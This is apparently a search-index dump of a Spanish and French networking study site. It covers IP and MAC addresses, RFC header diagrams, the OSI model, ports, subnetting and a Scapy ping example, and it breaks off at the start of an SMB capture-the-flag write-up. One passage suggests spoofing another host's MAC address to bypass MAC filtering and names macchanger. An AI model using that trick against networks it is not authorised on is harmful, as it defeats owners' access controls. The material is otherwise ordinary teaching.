<li>El campo de puerta de enlace predeterminada (en ingl\u00e9s gateway): \"nodo que sirve como enlace entre dos redes inform\u00e1ticas\" que permite que el protocolo de Internet sepa a qu\u00e9 m\u00e1quina entregar el datagrama si la m\u00e1quina de destino no est\u00e1 en la red local.</li> </ul>"},{"location":"redes/ip/#direcciones-ip","title":"Direcciones IP","text":"<p>Una direcci\u00f3n IP (del ingl\u00e9s, Internet Protocol) es una <code>etiqueta num\u00e9rica que identifica de manera l\u00f3gica y jer\u00e1rquica</code> a una interfaz \u2014habitualmente un dispositivo (computadora, laptop, tel\u00e9fono inteligente)\u2014 conectada a la red, que utilice el protocolo de internet o que corresponda al nivel de red del modelo TCP/IP.  </p> <p>Inicialmente se denominaba 'Direcci\u00f3n Internet', esta compuesta por una direcci\u00f3n de 32bits (4 octetos)</p> <p>Ejemplo de conversion de una direcci\u00f3n IP (192.168.0.1) de decimal hacia binario :</p> <pre><code>\u276f echo \"$(echo \"obase=2; 192\" | bc | numfmt --format=%08f).$(echo \"obase=2; 168\" | bc | numfmt --format=%08f).$(echo \"obase=2; 0\" | bc | numfmt --format=%08f).$(echo \"obase=2; 1\" | bc | numfmt --format=%08f)\"\n11000000.10101000.00000000.00000001\n</code></pre> <p>Un script para tenerlo mas a mano</p> <p>Un post sobre </p>"},{"location":"redes/ip/#direccion-internet-vs-url","title":"Direcci\u00f3n Internet vs URL","text":"<p>La direcci\u00f3n IP fu\u00e9 llamada direcci\u00f3n internet en la especificaci\u00f3n inicial, actualmente (por extension de lenguaje) es com\u00fan llamar direcci\u00f3n internet al sitio donde esta un recurso, pero no hay que confundir IP con URL (uniform resource locator) por ejemplo (con el protocolo http o https).</p> <p>Direcci\u00f3n Internet : una direcci\u00f3n de origen o destino de 4 octetos (32 bits) en la version IPv4 que <code>identifica una maquina o interfaz (hardware)</code> </p> <p>URL : gracias al protocolo DNS el URL corresponder\u00e1 con una direcci\u00f3n IP pero se busca un recurso que sera servido por una aplicaci\u00f3n (servidor) que puede igualmente servir recursos de otras maquinas (proxy). <code>Se solicitan datos (Software)</code></p> <p>V\u00e9ase tambi\u00e9n algunas referencias en los RFC : </p> <ul> <li>en [P\u00e1g. 8] de la RFC 791 de INTERNET PROTOCOL</li> <li>RFC1180: Un tutorial de TCP/IP (en espa\u00f1ol) que no te puedes perder ! si quieres profundizar en el tema.   El mismo en [FR] pero en pdf. </li> </ul> <p></p> <p> Direcci\u00f3n IP Identifica cada                  \"dispositivo\" que usa el Protocolo de Internet para comunicarse a trav\u00e9s de una red. Direcciones IPv4 en Wikipedia. IPv4 192.168.1.15 2001:db8:85a3:0:0:8a2e:370:7334 4 grupos de 3 digitos decimales de 0 a 255 (1 octeto), (11111111)^2 = (255)^10 = FFseparados por puntos '.' Direcciones IPv6 en Wikipedia. IPv6 8 grupos de 4 d\u00edgitos hexadecimalescada grupo representa 2 octetosdesde 0000 hasta FFFFseparados por 2 puntos ':' Decimal (32 bits) Hexadecimal (128 bits) Ver interfaz en wikipedia En inform\u00e1tica, una interfaz es un l\u00edmite compartido a trav\u00e9s del cual dos o m\u00e1s componentes separados de un sistema inform\u00e1tico intercambian informaci\u00f3n. interfaz </p>"},{"location":"redes/ip/#ip-datagram-header","title":"IP Datagram header","text":"<p>El encabezado IP muestra los bits y para que sirven, podemos apreciar las 2 direcciones (origen y destino), el TTL y une Checksum para verificar el estado (por ejemplo)  </p> <p>Un consejo, aunque leas los articulos en wikipedia en tu idioma, pasate por los que esten en ingl\u00e9s porque, a menudo la informacion puede ser mas precisa; por ejemplo :</p> <p>An IP header is header information at the beginning of an Internet Protocol (IP) packet. An IP packet is the smallest message entity exchanged via the Internet Protocol across an IP network. <code>IP packets consist of a header for addressing and routing, and a payload for user data</code>. The header contains information about IP version, source IP address, destination IP address, time-to-live, etc. The payload of an IP packet is typically a datagram or segment of the higher-level transport layer protocol, but may be data for an internet layer (e.g., ICMP or ICMPv6) or link layer (e.g., OSPF) instead. </p> <p><pre><code>3.1.  Internet Header Format\n\n  A summary of the contents of the internet header follows:\n\n    0                   1                   2                   3   \n    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |Version|  IHL  |Type of Service|          Total Length         |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |         Identification        |Flags|      Fragment Offset    |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |  Time to Live |    Protocol   |         Header Checksum       |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                       Source Address                          |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                    Destination Address                        |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                    Options                    |    Padding    |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n                    Example Internet Datagram Header\n\n                               Figure 4.\n\n  Note that each tick mark represents one bit position.\n</code></pre> Ver la RFC 791</p> <p>Se podr\u00eda comparar un paquete IP con una pagina HTML, los dos tienen encabezado y contenido.</p>"},{"location":"redes/mac/","title":"Direcciones MAC","text":"<p>Las direcciones MAC identifican una tarjeta o dispositivo de Red  ( M edia A ccess C ontrol ), oficialmente llamada \"MAC-48\"</p> <p>Se codifican en hexadecimal con 6 pares de 2 cifras hexadecimales separados por ':' (dos puntos) y en teor\u00eda se trata de un identificador \u00fanico para una tarjeta de red definido por su fabricante. Se puede considerar como si fuera una huella digital pero en la practica veamos como se puede cambiar : aunque ninguna otra tarjeta tenga el mismo, es la capa de sistema operativo la que gestiona y distribuye en la red, con lo que se puede modificar la direcci\u00f3n MAC que identifica la interfaz de red. Esta pr\u00e1ctica es conocida como MAC spoofing. Un ejemplo de tool para ello es macchanger, se pueden encontrar otros recursos como por ejemplo aqu\u00ed Las direcciones mac pueden servir igualmente para filtrar los hosts y atribuir permisos en una red por los administradores. Supongamos que conseguimos modificar la nuesta para que sea la misma que la de alguien que tenga acceso a un servicio y nosotros no...</p> <p>Un poco de numeraci\u00f3n : 2 cifras hexadecimales son un byte en binario (ocho bits o un octeto) Ejemplo [Hexa -&gt; Decimal -&gt; Binario]: FF = 255 = 11111111 </p> <p>Los c\u00f3digos de la direcci\u00f3n MAC tienen un significado :</p> <ul> <li>los 3 primeros bytes identifican al fabricante, es el identificador llamado OUI (Identificador \u00danico Organizacional)</li> <li>los 3 \u00faltimos bytes  representan el controlador de interfaz de red, que es asignado por el fabricante.</li> </ul> <p> Identificador de 48 bits (6 bloques de dos caracteres hexadecimales [8 bits]) que corresponde de forma \u00fanica a una tarjeta o dispositivo de red. Direcci\u00f3n MAC Direcci\u00f3n MAC Identifica cada                  o dispositivo de red con un n\u00famero \u00fanico. 6 grupos de 2 d\u00edgitos hexadecimalescada grupo representa 1 octetodesde 00 hasta FF separados por ':' Hexadecimal (48 bits) Ver interfaz en wikipedia En inform\u00e1tica, una interfaz es un l\u00edmite compartido a trav\u00e9s del cual dos o m\u00e1s componentes separados de un sistema inform\u00e1tico intercambian informaci\u00f3n. tarjeta 91:75:1a:ef:9a:c7 </p>"},{"location":"redes/mac/#documentacion-adicional","title":"Documentacion adicional","text":"<p>Estos temas se contemplan en : </p> <ul> <li>hack4u Introducci\u00f3n al Hacking.</li> <li>THM sobre nmap scan.</li> </ul>"},{"location":"redes/mindmap/","title":"Mindmap redes","text":"<ul> <li>Hecho con https://mermaid.live/</li> <li>El gist</li> </ul>"},{"location":"redes/modeloOSI/","title":"El modelo OSI","text":"<p>El modelo OSI (International Systems Interconnection) se explica por el hecho de que hay muchos constructores de hardware y si cada uno propusiera su arquitectura de comunicaci\u00f3n diferente no habr\u00eda manera de comprenderse. Para evitar la multiplicaci\u00f3n de soluciones de conexi\u00f3n, el ISO (International Standards Organisation) una organizaci\u00f3n que depende de la ONU y compuesta por mas de una centena de organismos de normalizaci\u00f3n ha desarrollado un sistema de referencia para todos. Cada sistema debe respetar el comportamiento global de la red al ser a\u00f1adido, modificado o suprimido de ella. En 1978, la ISO propuso este modelo bajo la norma ISO IS7498.</p> <p>Se trata mas de una especificaci\u00f3n de lo que tienen que hacer las capas y no de como se deben hacer las cosas, es un modelo de referencia para los protocolos de la red. El modelo OSI no es la definici\u00f3n de una topolog\u00eda ni un modelo de red en s\u00ed mismo. Tampoco espec\u00edfica ni define los protocolos que se utilizan en la comunicaci\u00f3n, ya que estos est\u00e1n implementados de forma independiente a este modelo. Lo que realmente hace OSI es definir la funcionalidad de ellos para conseguir un est\u00e1ndar. Lo que deben hacer y no como lo hacen.</p>"},{"location":"redes/modeloOSI/#composicion","title":"Composici\u00f3n","text":"<p>El modelo OSI est\u00e1 conformado por 7 capas o niveles de abstracci\u00f3n. </p> <ul> <li>Capa Medio - Capa 0* (Layer Zero) No oficial.</li> </ul> Capas Nombre Prop\u00f3sito 1 f\u00edsica cables de cobre o fibra \u00f3ptica 2 enlace de datos transferencia y control de error 3 red enrutamiento de paquetes de datos 4 transporte      control de flujo y la correcci\u00f3n de errores (entre otros) 5 sesi\u00f3n          establecimiento, mantenimiento y control de sesiones 6 presentaci\u00f3n    codificaci\u00f3n, decodificaci\u00f3n, compresi\u00f3n y cifrado de datos 7 aplicaci\u00f3n      servicios para aplicaciones de usuario finales <p> Image from wikimedia</p> <p>Existe igualmente el Modelo TCP/IP</p> <p>TCP/IP es un conjunto de protocolos que permiten la comunicaci\u00f3n entre los ordenadores pertenecientes a una red. La sigla TCP/IP significa Protocolo de control de transmisi\u00f3n/Protocolo de Internet. Proviene de los nombres de dos protocolos importantes incluidos en el conjunto TCP/IP, es decir, del protocolo TCP y del protocolo IP.</p>"},{"location":"redes/modeloOSI/#encapsulacion-de-datos","title":"Encapsulaci\u00f3n de datos","text":"<p>Durante una transmisi\u00f3n, los datos pasan a trav\u00e9s de cada una de las capas al nivel de la m\u00e1quina emisora, de la 7 a la 1. En cada capa se agrega informaci\u00f3n al paquete de datos, es un encabezado, un conjunto de informaci\u00f3n que garantiza la transmisi\u00f3n. En la m\u00e1quina receptora, al pasar por cada capa (de 1 a 7), se lee la cabecera y luego se borra. As\u00ed, al recibirlo, el mensaje se encuentra en su estado original.</p> <p>En cada nivel, el paquete de datos cambia de apariencia, porque se le agrega un encabezado, por lo que los nombres cambian seg\u00fan las capas:</p> <ul> <li>El paquete de datos se denomina mensaje de capa de aplicaci\u00f3n [7].</li> <li>Luego, el mensaje se encapsula como un segmento en la capa de transporte [4].</li> <li>El segmento una vez encapsulado en la capa de Internet toma el nombre de datagrama [3].</li> <li>Finalmente, hablamos de tramas a nivel de la capa de acceso a la red .</li> </ul> <p>La web de frameip  estupenda para aprender sobre conceptos de redes.  </p>"},{"location":"redes/protocolos/","title":"Protocolos comunes","text":"<p>Los protocolos mas comunes son el TCP o UDP pero hay muchos mas que se utilizan la pila OSI.</p> <ul> <li>TCP (Transmission Control Protocol) orientado a conexi\u00f3n, en la capa de \"transporte\" </li> <li>UDP (User Datagram Protocol) no orientado a conexi\u00f3n y no ofrece control de errores.</li> </ul>"},{"location":"redes/protocolos/#les-caracteristiques-du-protocole-tcp","title":"Les caract\u00e9ristiques du protocole TCP","text":"<p>TCP (qui signifie Transmission Control Protocol, soit en fran\u00e7ais: Protocole de Contr\u00f4le de Transmission) est un des principaux protocoles de la couche transport du mod\u00e8le TCP/IP. Il permet, au niveau des applications, de g\u00e9rer les donn\u00e9es en provenance (ou \u00e0 destination) de la couche inf\u00e9rieure du mod\u00e8le (c'est-\u00e0-dire le protocole IP). Lorsque les donn\u00e9es sont fournies au protocole IP, celui-ci les encapsule dans des datagrammes IP, en fixant le champ protocole \u00e0 6 (Pour savoir que le protocole en amont est TCP...). TCP est un protocole orient\u00e9 connexion, c'est-\u00e0-dire qu'il permet \u00e0 deux machines qui communiquent de contr\u00f4ler l'\u00e9tat de la transmission. Les caract\u00e9ristiques principales du protocole TCP sont les suivantes :</p> <ul> <li>TCP permet de remettre en ordre les datagrammes en provenance du protocole IP</li> <li>TCP permet de v\u00e9rifier le flot de donn\u00e9es afin d'\u00e9viter une saturation du r\u00e9seau</li> <li>TCP permet de formater les donn\u00e9es en segments de longueur variable afin de les \"remettre\" au protocole IP</li> <li>TCP permet de multiplexer les donn\u00e9es, c'est-\u00e0-dire de faire circuler simultan\u00e9ment des informations provenant de sources (applications par exemple) distinctes sur une m\u00eame ligne</li> <li>TCP permet enfin l'initialisation et la fin d'une communication de mani\u00e8re courtoise (3 way handshake)</li> </ul> <p><pre><code>This document describes TCP, which uses TCP headers.\n\nA TCP header, followed by any user data in the segment, is formatted as follows, using the style from [66]:\n\n    0                   1                   2                   3\n    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |          Source Port          |       Destination Port        |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                        Sequence Number                        |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                    Acknowledgment Number                      |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |  Data |       |C|E|U|A|P|R|S|F|                               |\n   | Offset| Rsrvd |W|C|R|C|S|S|Y|I|            Window             |\n   |       |       |R|E|G|K|H|T|N|N|                               |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |           Checksum            |         Urgent Pointer        |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                           [Options]                           |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                                                               :\n   :                             Data                              :\n   :                                                               |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n          Note that one tick mark represents one bit position.\nFigure 1: TCP Header Format\n</code></pre> cf: RFC 9293</p>"},{"location":"redes/protocolos/#puertos-tcp-comunes","title":"Puertos TCP comunes:","text":"<ul> <li>21: FTP (File Transfer Protocol) \u2013 permite la transferencia de archivos entre sistemas.</li> <li>22: SSH (Secure Shell) \u2013 un protocolo de red seguro que permite a los usuarios conectarse y administrar sistemas de forma remota.<ul> <li>Cf: Bandit lvl 13</li> </ul> </li> <li>23: Telnet \u2013 un protocolo utilizado para la conexi\u00f3n remota a dispositivos de red.<ul> <li>Cf: Meow (HTB) </li> </ul> </li> <li>80: HTTP (Hypertext Transfer Protocol) \u2013 el protocolo que se utiliza para la transferencia de datos en la World Wide Web. rfc9110 'HTTP Semantics'</li> <li>443: HTTPS (Hypertext Transfer Protocol Secure) \u2013 la versi\u00f3n segura de HTTP, que utiliza encriptaci\u00f3n SSL/TLS para proteger las comunicaciones web.</li> </ul>"},{"location":"redes/protocolos/#les-caracteristiques-du-protocole-udp","title":"Les caract\u00e9ristiques du protocole UDP","text":"<p>Le protocole UDP (User Datagram Protocol) est un protocole non orient\u00e9 connexion de la couche transport du mod\u00e8le TCP/IP. Ce protocole est tr\u00e8s simple \u00e9tant donn\u00e9 qu'il ne fournit pas de contr\u00f4le d'erreurs (il n'est pas orient\u00e9 connexion...).</p> <p><pre><code>The pseudo  header  conceptually prefixed to the UDP header contains the\nsource  address,  the destination  address,  the protocol,  and the  UDP\nlength.   This information gives protection against misrouted datagrams.\nThis checksum procedure is the same as is used in TCP.\n\n                  0      7 8     15 16    23 24    31\n                 +--------+--------+--------+--------+\n                 |          source address           |\n                 +--------+--------+--------+--------+\n                 |        destination address        |\n                 +--------+--------+--------+--------+\n                 |  zero  |protocol|   UDP length    |\n                 +--------+--------+--------+--------+\n</code></pre> L'en-t\u00eate du segment UDP est donc tr\u00e8s simple : voir sur la RFC 768</p>"},{"location":"redes/protocolos/#puertos-udp-comunes","title":"Puertos UDP comunes:","text":"<ul> <li>53: DNS (Domain Name System) \u2013 un sistema que traduce nombres de dominio en direcciones IP.</li> <li>67/68: DHCP (Dynamic Host Configuration Protocol) \u2013 un protocolo utilizado para asignar direcciones IP y otros par\u00e1metros de configuraci\u00f3n a los dispositivos en una red.</li> <li>69: TFTP (Trivial File Transfer Protocol) \u2013 un protocolo simple utilizado para transferir archivos entre dispositivos en una red.</li> <li>123: NTP (Network Time Protocol) \u2013 un protocolo utilizado para sincronizar los relojes de los dispositivos en una red.</li> <li>161: SNMP (Simple Network Management Protocol) \u2013 un protocolo utilizado para administrar y supervisar dispositivos en una red.</li> </ul>"},{"location":"redes/protocolos/#mas-lejos-con-protocolos","title":"Mas lejos con protocolos","text":"<p>Para entrar a jugar con protocolos, es decir si haces algun tool o quieres ver cosas sobre protocolos en linea de comandos, hay una lib en Python llamada Scapy (Scapy is a Python program that enables the user to send, sniff and dissect and forge network packets.)</p> <p>Un ejemplo de como utilizarlo, aqui forjamos un paquete IP (capa 3) y lo enviamos al router, luego vamos a encapsular una traza ICMP y ver que nos devuelve; un ping casero que nos permite ver el encabezado ICMP</p> <pre><code>\u276f sudo scapy -H\n[sudo] Mot de passe de rnek0\u00a0: Welcome to Scapy (2023.03.29) using IPython 8.11.0\n&gt;&gt;&gt; a=IP(ttl=10)\n&gt;&gt;&gt; a.src\n'127.0.0.1'\n&gt;&gt;&gt; a\n&lt;IP  ttl=10 |&gt;\n&gt;&gt;&gt; a.dst=\"192.168.1.1\"\n&gt;&gt;&gt; a\n&lt;IP  ttl=10 dst=192.168.1.1 |&gt;\n&gt;&gt;&gt; a.src\n'192.168.1.19'\n&gt;&gt;&gt; a.dst\n'192.168.1.1'\n&gt;&gt;&gt; send(a/ICMP())\n.\nSent 1 packets.\n&gt;&gt;&gt; p = sr1(a/ICMP())\nBegin emission:\nFinished sending 1 packets.\n\nReceived 1 packets, got 1 answers, remaining 0 packets\n&gt;&gt;&gt; p.show()\n###[ IP ]### \nversion   = 4\nihl       = 5\ntos       = 0x0\n  len       = 28\nid        = 32331\nflags     = frag      = 0\nttl       = 64\nproto     = icmp\n  chksum    = 0x7931\n  src       = 192.168.1.1\n  dst       = 192.168.1.19\n  \\options   \\\n###[ ICMP ]### \ntype      = echo-reply\n     code      = 0\nchksum    = 0xffff\n     id        = 0x0\n     seq       = 0x0\n     unused    = ''\n###[ Padding ]### \nload      = '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n</code></pre> <p>Una miradita con nuestro amigo wireshark : </p> <p>Aqui vemos el ttl de 10 que le pusimos al envio (por ejemplo)</p> <p></p> <p>Aqui mas cosillas como la encapsulacion de icmp dentro de ip para nuestro ping casero.</p> <p></p> <p>Para acabar con el tema que da para largo, un enlace para ver como se v\u00e9 el protocolo TCP desde un punto de vista de desarrollador con C y sockets </p>"},{"location":"redes/puertos/","title":"Puertos","text":"<p>Muchos programas que utilizan TCP/IP se pueden ejecutar simult\u00e1neamente en Internet (por ejemplo, puedes abrir varios navegadores simult\u00e1neamente o navegar por p\u00e1ginas HTML mientras descargas un archivo a trav\u00e9s de FTP, o enviar un mail). Cada uno de estos programas trabaja con un protocolo diferente, sin embargo, la computadora debe ser capaz de distinguir entre las diferentes fuentes de datos (programas).</p>"},{"location":"redes/puertos/#65536","title":"65536","text":"<p>A cada una de estas aplicaciones se le asigna una direcci\u00f3n \u00fanica en la m\u00e1quina, codificada en 16 bits: un puerto (la combinaci\u00f3n direcci\u00f3n IP + puerto es entonces una direcci\u00f3n \u00fanica en el mundo, se llama socket ).</p> <p>Un poco de numeraci\u00f3n :</p> <ul> <li>1 bit = unidad at\u00f3mica, (la mas peque\u00f1a unidad binaria que represente una informaci\u00f3n)</li> <li>1 octeto = 8 bits = 2 cifras en hexadecimal. Ejemplo 'A5' de hex a bin : A = 1010 y 5 = 0101</li> <li>16 bits = 2 octetos = 4 cifras hexa</li> <li>Puertos : 2\u00b9\u2076 = 65536 en decimal</li> </ul>"},{"location":"redes/puertos/#cliente-servidor","title":"Cliente / Servidor","text":"<p>El n\u00famero de puerto indica la aplicaci\u00f3n para la que est\u00e1n destinados los datos. De esta forma, cuando el ordenador recibe informaci\u00f3n con destino a un puerto, los datos se env\u00edan a la aplicaci\u00f3n correspondiente. Si es una solicitud a la aplicaci\u00f3n, la aplicaci\u00f3n se denomina aplicaci\u00f3n de servidor. Si es una respuesta, se denomina aplicaci\u00f3n cliente.</p>"},{"location":"redes/puertos/#clasificacion-de-los-puertos","title":"Clasificaci\u00f3n de los puertos","text":"<ul> <li>los n\u00fameros de puerto del 0 al 1023 corresponden a los puertos \"bien conocidos\", utilizados para los servicios de red m\u00e1s comunes</li> <li>los n\u00fameros de puerto del 1024 al 49151 corresponden a puertos registrados, asignados por la IANA</li> <li>los n\u00fameros de puerto del 49.152 al 65.535 corresponden a los puertos din\u00e1micos, los cuales pueden ser utilizados para cualquier tipo de solicitudes TCP o UDP distintas a las mencionadas anteriormente.</li> </ul>"},{"location":"redes/puertos/#lista-de-los-puertos-mas-comunes","title":"Lista de los puertos mas comunes","text":"<p>La lista de puertos de la IANA, organismo responsable de coordinar algunos de los elementos clave que hacen que Internet funcione sin problemas.</p> <p>Algunos puertos utilizados con el protocolo TCP </p> <ul> <li>21 FTP File transfert protocol</li> <li>22 SSH Secure Shell </li> <li>25 SMTP Simple Mail Transfer Protocol </li> <li>80 HTTP Hypertext Transfer Protocol</li> <li>110 POP Post Office Protocol , SMTP</li> <li>139 NetBIOS </li> <li>443 HTTPS *Hypertext Transfer Protocol over TLS/SSL *</li> </ul> <p>Une liste des ports dans la wiki fr Liste de ports</p> <p>En espa\u00f1ol Puertos</p>"},{"location":"redes/subnetting/","title":"Subnetting","text":"<p>Imagina que tu maquina tenga que memorizar la Direcci\u00f3n IP de todas las maquinas de internet e igualmente el camino para llegar a ellas. Deber\u00eda conservar una lista de mil millones y mucho mas de maquinas, y eso no es algo muy optimo. Para que podamos acceder a todos los dispositivos (aunque sea una c\u00e1mara ip o una tostadora de red) se ha dividido la red en subredes, para que sea mas f\u00e1cil de utilizar y optimizar los intercambios de informaci\u00f3n en la red, esas subredes se encargaran de atribuir las Direcciones IP para encontrar las maquinas y distribuir la informaci\u00f3n.  </p> <p>Por ello hace falta dos direcciones para identificar a una maquina, una para la subred y otra para la maquina en si. Pero como funciona esto si solo tenemos una direcci\u00f3n IP para identificar una maquina ? Pues a\u00f1adiendo la direcci\u00f3n de la red, y como encontramos la direcci\u00f3n de la red ? pues con la mascara de red.</p> <p>La m\u00e1scara de subred es un separador entre la parte de la red y la parte de la m\u00e1quina de una direcci\u00f3n IP.  </p> <p>Puedes ver tu mascara de subred en la configuraci\u00f3n de tu tarjeta de red (el campo netmask), por ejemplo con el comando ipconfig en windows o ifconfig en Linux :</p> <pre><code>$ ifconfig\neno1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\ninet 192.168.1.16  netmask 255.255.255.0  broadcast 192.168.1.255\n...\n</code></pre> <p>Gracias a la mascara de red tenemos dos identificadores para nuestro ordenador, la Direccion IP y la red. Esto esta a la base del subnetting. De hecho al configurar una interfaz (tarjeta de red) se te pide una IP e igualmente la mascara de red.</p> <p>Es lo mismo que cuando mandas una carta a alguien, poniendo el nombre de la ciudad, es la oficina de correo de la ciudad la que distribuye a la direcci\u00f3n correcta. Como sabemos, en las ciudades a menudo hay calles o avenidas que tienen el mismo nombre que en otras ciudades. Por ello en casa, en la LAN (local area network) yo puedo tener la misma IP que tu en tu casa, sin embargo la Direcci\u00f3n IP de tu router (el punto de entrada a tu subred hacia tu area local) sera una IP expuesta al exterior de la red. Ese nodo (tu router) tiene dos Direcciones IP en interfaces distintas (una para casa y otra para la calle) es decir una ip publica y una ip privada.  Un vid\u00e9o explicativo por Alvaro Chirou</p>"},{"location":"redes/subnetting/#direccionamiento-y-arquitectura-de-clases-de-red","title":"Direccionamiento y arquitectura de clases de red","text":"<p>En las primeras etapas del desarrollo del Protocolo de Internet,\u200b los administradores de Internet interpretaban las direcciones IP en dos partes, los primeros 8 bits para designar la direcci\u00f3n de red y el resto para individualizar la computadora dentro de la red. Este m\u00e9todo pronto prob\u00f3 ser inadecuado, cuando se comenzaron a agregar nuevas redes a las ya asignadas. En 1981 el direccionamiento internet fue revisado y se introdujo la arquitectura de clases. (classful network architecture).\u200b En esta arquitectura hay tres clases de direcciones IP que una organizaci\u00f3n puede recibir de parte de la Internet Corporation for Assigned Names and Numbers (ICANN): clase A, clase B y clase C.</p> <ul> <li>Clase A : el primer octeto identifica la red. De 0 a 127 en su primer octeto.</li> <li>Clase B : los dos primeros octetos identifican la red. De 128 a 191 en su primer octeto.</li> <li>Clase C : los tres primeros\u200b octetos identifican la red. De 192 a 223 en su primer octeto.</li> </ul> <p>El dise\u00f1o de redes de clases (classful) no era escalable y frente a una gran expansi\u00f3n de las redes fue reemplazado por una arquitectura de redes sin clases Classless Inter-Domain Routing (CIDR)\u200b en el a\u00f1o 1993.</p>"},{"location":"redes/subnetting/#cidr","title":"CIDR","text":"<p>A menudo vemos esta notaci\u00f3n : 192.168.1.16/24 ya veremos con la mascara de subred que el 24 corresponde al numero de bits a 1 llamado prefijo.</p> <p>El numero detr\u00e1s del \"/\" es el CIDR (Classless Inter-Domain Routing)</p> <p>Pero como utilizo la \"netmask\" para conocer la direcci\u00f3n de la red? </p> <p>Como sabemos, una IP son 32 bits separados por puntos, es decir 4 octetos separados por puntos. El mayor valor posible de 8 bits en decimal es 255, para hacer el calculo ver en esta web :</p> <p></p> <p>Podemos pues decir que nuestra mascara de red en binario es :</p> <p>11111111.11111111.11111111.00000000</p> <p>De la misma manera podemos convertir nuestra direcci\u00f3n ip de decimal a binario con esta utilidad :</p> <p>11000000.10101000.00000001.00010000</p> <p>La direcci\u00f3n IP completa se calcula realizando un AND l\u00f3gico solo con aquellos bits a 1 que indique la m\u00e1scara de subred (MS). </p> Direcciones Direcciones en binario Direcciones en decimal mascara   : 11111111.11111111.11111111.00000000 255.255.255.000 ip        : 11000000.10101000.00000001.00010000 192.168.001.016 resultado : 11000000.10101000.00000001.00000000 192.168.001.000"},{"location":"redes/subnetting/#direccion-de-subred","title":"Direcci\u00f3n de subred","text":"<p>La parte de direcci\u00f3n de la subred es : 192.168.1.0 y el nombre de maquinas permitidas sera 256 (2\u2078) pero en realidad hay dos menos, porque ? La primera es la direcci\u00f3n de la red y la ultima la del broadcast; esas dos ip est\u00e1n reservadas, por ello yo pienso que son 254 en este caso.</p> <p>Para mas calculos de mascaras ver la hoja de calculo con LibreOffice.</p>"},{"location":"redes/subnetting/#direcciones-especificas-red-y-broadcast","title":"Direcciones especificas (red y broadcast)","text":"<p>En la red, la primera direcci\u00f3n y la ultima tienen un papel particular :</p> <ul> <li>La primera est la direcci\u00f3n de la red. En nuestro ejemplo : 192.168.1.0</li> <li>La ultima es la direcci\u00f3n de broadcast, esta direcci\u00f3n es la que permite transmitir a todas las m\u00e1quinas de la red. As\u00ed, cuando queremos enviar informaci\u00f3n a todas las m\u00e1quinas, utilizamos esta direcci\u00f3n. En nuestro ejemplo : 192.168.1.255</li> </ul> <p>Una herramienta para ejercicios sobre calculos de subredes a partir del CIDR</p> <p> CIDR to IPv4 Conversion CIDR </p>"},{"location":"tiers0/dancing/","title":"Dancing","text":"<p> Windows</p> <p>Introduction</p> <p>Il existe plusieurs fa\u00e7ons de transf\u00e9rer un fichier entre deux h\u00f4tes (ordinateurs) sur le m\u00eame r\u00e9seau. L'un de ces protocoles est \u00e9tudi\u00e9 ici, il s'agit de SMB (Server Message Block). Ce protocole de communication fournit un acc\u00e8s partag\u00e9 aux fichiers, aux imprimantes et aux ports s\u00e9rie entre les terminaux d'un r\u00e9seau. Nous voyons principalement des services SMB s'ex\u00e9cuter sur des machines Windows. Lors de l'analyse, nous verrons g\u00e9n\u00e9ralement le port 445 TCP ouvert sur la cible, r\u00e9serv\u00e9 au protocole SMB.</p> <p>Habituellement, SMB s'ex\u00e9cute au niveau des couches Application ou Pr\u00e9sentation du mod\u00e8le OSI, illustr\u00e9 ci-dessous. Pour cette raison, il s'appuie sur des protocoles de niveau inf\u00e9rieur pour le transport. Le protocole de couche transport avec lequel le protocole Microsoft SMB est le plus souvent utilis\u00e9 est NetBIOS sur TCP/IP (NBT). C'est pourquoi, lors des analyses, nous verrons tr\u00e8s probablement les deux protocoles avec des ports ouverts en cours d'ex\u00e9cution sur la cible lors de la phase d'\u00e9num\u00e9ration.</p> <p>Nous pouvons apprendre plus sur les reseaux avec le module de htb : Introduction to Networking , le module d'introduction au Hacking de hack4u ou sur THM (par exemple).</p> <p>Grace au protocole SMB, une application (ou l'utilisateur d'une application) peut acc\u00e9der \u00e0 des fichiers sur un serveur distant, ainsi qu'\u00e0 d'autres ressources telles que des imprimantes. Ainsi, une application cliente 